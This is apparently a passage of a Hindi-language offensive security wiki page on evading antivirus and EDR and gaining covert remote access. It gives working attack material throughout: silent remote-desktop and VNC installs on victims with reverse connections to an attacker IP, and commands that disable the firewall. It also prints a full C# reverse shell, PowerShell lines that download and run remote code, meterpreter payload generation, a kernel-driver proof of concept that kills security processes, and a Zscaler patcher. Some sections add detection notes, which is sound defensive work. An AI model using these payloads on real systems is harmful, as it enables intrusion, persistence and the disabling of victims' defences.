Token stomping एक तकनीक है जो attacker को access token या किसी security product जैसे EDR या AV को manipulate करने की अनुमति देती है, जिससे वे उसकी privileges घटा सकते हैं ताकि process मर न पाए पर उसके पास malicious गतिविधियों की जाँच करने की permissions न रहें।

Windows इसे रोकने के लिए security processes के tokens पर external processes को handles मिलने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में वर्णित है, एक victim के पीसी पर Chrome Remote Desktop deploy करना और फिर उससे takeover और persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI फ़ाइल डाउनलोड करने के लिए MSI फ़ाइल पर क्लिक करें।
2. victim पर silently installer चलाएँ (admin आवश्यक): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाकर next पर क्लिक करें। विज़ार्ड फिर आपको authorize करने के लिए कहेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. दिए गए parameter को कुछ समायोजन के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin param जो GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है)。


## Advanced Evasion

Evasion एक बहुत ही जटिल विषय है, कभी-कभी आपको केवल एक सिस्टम में कई अलग-अलग telemetry स्रोतों को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह से undetected रहना लगभग असंभव है।

हर environment जिसकी आप परीक्षा लेते हैं, उसकी अपनी मजबूत और कमजोरियाँ होंगी।

मैं आपको प्रोत्साहित करता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखें, ताकि Advanced Evasion तकनीकों में foothold मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth के बारे में एक और बहुत बढ़िया talk भी है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को निकालते हुए यह पता लगाएगा कि Defender किस हिस्से को malicious मानता है और वह उसे आपको अलग करके बताएगा।\
इसी काम को करने वाला एक और टूल है [**avred**](https://github.com/dobin/avred) जिसके पास एक open web सर्विस भी है [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Windows10 के पहले तक, सभी Windows में एक **Telnet server** आता था जिसे आप install कर सकते थे (administrator के रूप में) ऐसा करके:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
सिस्टम शुरू होने पर इसे **start** करें और अभी इसे **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (stealth) और firewall को अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin डाउनलोड चाहिए, setup नहीं)

**ON THE HOST**: _**winvnc.exe**_ को चलाएँ और सर्वर कॉन्फ़िगर करें:

- ऑप्शन _Disable TrayIcon_ सक्षम करें
- _VNC Password_ में एक पासवर्ड सेट करें
- _View-Only Password_ में एक पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नई** बनाई गई फ़ाइल _**UltraVNC.ini**_ को **victim** के अंदर रखें

#### **Reverse connection**

**attacker** को अपने **host** पर बाइनरी `vncviewer.exe -listen 5900` चलानी चाहिए ताकि यह reverse **VNC connection** पकड़ने के लिए तैयार रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` शुरू करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**WARNING:** छुपने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- यदि `winvnc` पहले से चल रहा है तो इसे शुरू न करें वरना आप एक [popup](https://i.imgur.com/1SROTTl.png) ट्रिगर कर देंगे। जांचें कि यह चल रहा है या नहीं: `tasklist | findstr winvnc`
- उसी डायरेक्टरी में `UltraVNC.ini` के बिना `winvnc` न चलाएँ वरना यह [the config window](https://i.imgur.com/rfMQWcf.png) खोलेगा
- मदद के लिए `winvnc -h` न चलाएँ वरना आप एक [popup](https://i.imgur.com/oc18wcu.png) ट्रिगर कर देंगे

### GreatSCT

इसे डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **lister को शुरू करें** `msfconsole -r file.rc` के साथ और **execute** करें **xml payload** के साथ:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान Defender प्रक्रिया को बहुत जल्दी समाप्त कर देगा।**

### अपना खुद का reverse shell कम्पाइल करना

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे निम्न कमांड के साथ कम्पाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे निम्न के साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# में कम्पाइलर का उपयोग
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python का उपयोग करके build injectors का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य टूल्स
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को निष्क्रिय करना

Storm-2603 ने एक छोटे कंसोल यूटिलिटी **Antivirus Terminator** का उपयोग करके endpoint सुरक्षा को डिसेबल किया और फिर ransomware गिराया। यह टूल अपना **own vulnerable but *signed* driver** लाता है और इसे मिसयूज़ करके privileged kernel ऑपरेशंस करता है जिन्हें Protected-Process-Light (PPL) AV सेवाएं भी ब्लॉक नहीं कर पातीं।

Key take-aways
1. **Signed driver**: डिस्क पर जो फाइल डिलीवर की गई थी वह `ServiceMouse.sys` है, लेकिन बाइनरी Antiy Labs’ के “System In-Depth Analysis Toolkit” का वैध रूप से साइन किया हुआ ड्राइवर `AToolsKrnl64.sys` है। क्योंकि ड्राइवर पर वैध Microsoft सिग्नेचर है यह तब भी लोड हो जाता है जब Driver-Signature-Enforcement (DSE) सक्षम हो।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन ड्राइवर को **kernel service** के रूप में रजिस्टर करती है और दूसरी लाइन इसे शुरू करती है ताकि `\\.\ServiceMouse` user land से एक्सेस किया जा सके।
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी प्रक्रिया को समाप्त करना (Defender/EDR सेवाओं को मारने के लिए उपयोग किया गया) |
| `0x990000D0` | डिस्क पर किसी भी फाइल को डिलीट करना |
| `0x990001D0` | ड्राइवर अनलोड करना और सेवा को हटाना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD user-mode सुरक्षा को पूरी तरह स्किप कर देता है; kernel में चलने वाला कोड *protected* प्रक्रियाओं को खोल सकता है, उन्हें समाप्त कर सकता है, या kernel ऑब्जेक्ट्स में छेड़छाड़ कर सकता है, PPL/PP, ELAM या अन्य हार्डनिंग फीचर की परवाह किए बिना।

Detection / Mitigation
• Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) सक्षम करें ताकि Windows `AToolsKrnl64.sys` लोड करने से मना कर दे।  
• नए *kernel* services के निर्माण की मॉनिटरिंग करें और अलर्ट जारी करें जब कोई ड्राइवर world-writable डायरेक्टरी से लोड हो या allow-list पर मौजूद न हो।  
• custom device objects के लिए user-mode handles और उसके बाद संदिग्ध `DeviceIoControl` कॉल्स पर नज़र रखें।

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler का **Client Connector** device-posture नियम लोकली लागू करता है और Windows RPC पर भरोसा करके परिणामों को अन्य कंपोनेंट्स को बताता है। दो कमजोर डिजाइन विकल्प पूरी बायपास को संभव बनाते हैं:

1. Posture मूल्यांकन पूरी तरह से **client-side** पर होता है (एक boolean सर्वर को भेजा जाता है)।  
2. Internal RPC endpoints केवल यह सत्यापित करते हैं कि कनेक्ट करने वाला executable **signed by Zscaler** है (via `WinVerifyTrust`)।

डिस्क पर चार signed binaries को पैच करके दोनों मेकैनिज्म को निष्क्रिय किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है ताकि हर चेक compliant हो |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) process RPC पाइप्स से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से प्रतिस्थापित |
| `ZSATunnel.exe` | टनेल पर integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
मूल फाइलों को प्रतिस्थापित करने और सर्विस स्टैक को पुनरारंभ करने के बाद:

* **सभी** पोस्टचर चेक्स **हरा/संगत** दिखाते हैं।
* अनसाइन किए गए या संशोधित बाइनरी नामित-पाइप RPC endpoints खोल सकती हैं (उदा. `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* समझौता किया गया होस्ट Zscaler नीतियों द्वारा परिभाषित आंतरिक नेटवर्क तक असीमित पहुँच प्राप्त कर लेता है।

यह केस स्टडी दिखाती है कि कैसे केवल क्लाइंट-साइड ट्रस्ट निर्णय और सरल सिग्नेचर चेक कुछ बाइट पैचेस से हराए जा सकते हैं।

## Protected Process Light (PPL) का दुरुपयोग करके AV/EDR को LOLBINs से छेड़छाड़ करना

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल समान या उच्च-स्तर के protected processes ही एक-दूसरे को छेड़ सकें। आक्रामक दृष्टिकोण से, यदि आप वैध रूप से एक PPL-सक्षम बाइनरी लॉन्च कर सकते हैं और इसके arguments नियंत्रित कर सकते हैं, तो आप सामान्य कार्यक्षमता (जैसे logging) को AV/EDR द्वारा उपयोग किए जाने वाले protected डायरेक्टरीज़ के खिलाफ एक सीमित, PPL-समर्थित write primitive में बदल सकते हैं।

What makes a process run as PPL
- लक्षित EXE (और कोई भी लोडेड DLLs) PPL-सक्षम EKU के साथ साइन किए गए होने चाहिए।
- प्रोसेस को CreateProcess के साथ बनाए जाना चाहिए और flags का उपयोग होना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- एक संगत protection level का अनुरोध किया जाना चाहिए जो बाइनरी के signer से मेल खाता हो (उदा., anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`). गलत लेवल पर creation विफल हो जाएगा।

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- ओपन-सोर्स सहायक: CreateProcessAsPPL (प्रोटेक्शन लेवल चुनता है और तर्कों को लक्ष्य EXE पर अग्रेषित करता है):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- उपयोग पैटर्न:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN प्रिमिटिव: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` स्वयं स्पॉन करता है और कॉलर-निर्दिष्ट पथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करता है।
- जब इसे PPL प्रोसेस के रूप में लॉन्च किया जाता है, तो फ़ाइल लेखन PPL समर्थन के साथ होता है।
- ClipUp स्पेस वाले पथों को पार्स नहीं कर सकता; सामान्यतः संरक्षित स्थानों की ओर इंगित करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- शॉर्ट नाम सूची करने के लिए: `dir /x` प्रत्येक parent directory में।
- cmd में शॉर्ट पथ निकालने के लिए: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ एक लॉन्चर (उदा., CreateProcessAsPPL) का उपयोग करके लॉन्च करें।
2) ClipUp को log-path argument पास करें ताकि एक फ़ाइल protected AV directory (उदा., Defender Platform) में बन जाए। आवश्यकता होने पर 8.3 short names का उपयोग करें।
3) अगर target binary सामान्यतः AV द्वारा चलने के दौरान खुला/लॉक रहता है (उदा., MsMpEng.exe), तो AV के शुरू होने से पहले बूट पर लिखने का शेड्यूल करने के लिए ऐसा auto-start service इंस्टॉल करें जो भरोसेमंद रूप से पहले चले। Process Monitor (boot logging) के साथ बूट ऑर्डरिंग को मान्य करें।
4) रिबूट पर PPL-backed लेखन उस समय होता है जब AV अपने बाइनरी लॉक करने से पहले, जिससे target फ़ाइल करप्ट हो सकती है और स्टार्टअप रोक दिया जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
नोट्स और सीमाएँ
- आप ClipUp द्वारा लिखी जाने वाली सामग्री को केवल स्थान के अलावा नियंत्रित नहीं कर सकते; यह primitive सटीक सामग्री इंजेक्शन के बजाय भ्रष्ट करने के लिए उपयुक्त है।
- एक सेवा को स्थापित/शुरू करने और रिबूट विंडो के लिए local admin/SYSTEM की आवश्यकता होती है।
- टाइमिंग महत्वपूर्ण है: लक्ष्य खुला नहीं होना चाहिए; बूट-टाइम निष्पादन फ़ाइल लॉक से बचाता है।

डिटेक्शंस
- असामान्य आर्ग्युमेंट्स के साथ `ClipUp.exe` की प्रक्रिया बनना, विशेषकर non-standard launchers द्वारा parent होने पर, बूट के आस-पास।
- नए सर्विसेज़ जो संदिग्ध बाइनरीज़ को auto-start के लिए कॉन्फ़िगर की गई हों और लगातार Defender/AV से पहले शुरू हो रही हों। Defender startup failures से पहले की service creation/modification की जांच करें।
- Defender binaries/Platform निर्देशिकाओं पर फ़ाइल अखंडता मॉनिटरिंग; protected-process flags वाले प्रक्रियाओं द्वारा अनपेक्षित फ़ाइल निर्माण/परिवर्तन।
- ETW/EDR telemetry: उन प्रक्रियाओं को देखें जो `CREATE_PROTECTED_PROCESS` के साथ बनाई गई हों और non-AV बाइनरीज़ द्वारा असामान्य PPL स्तर का उपयोग।

निवारण
- WDAC/Code Integrity: यह सीमित करें कि कौन‑से signed binaries PPL के रूप में और किन parent processes के अंतर्गत चल सकते हैं; वैध संदर्भों के बाहर ClipUp के invocation को ब्लॉक करें।
- Service hygiene: auto-start सेवाओं के creation/modification को सीमित करें और start-order में बदलाव की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हों; ऐसे startup errors की जांच करें जो बाइनरी करप्शन का संकेत देते हों।
- यदि आपके वातावरण के अनुकूल हो तो security tooling होस्ट करने वाले वॉल्यूम पर 8.3 short-name generation को अक्षम करने पर विचार करें (पूरी तरह परीक्षण करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
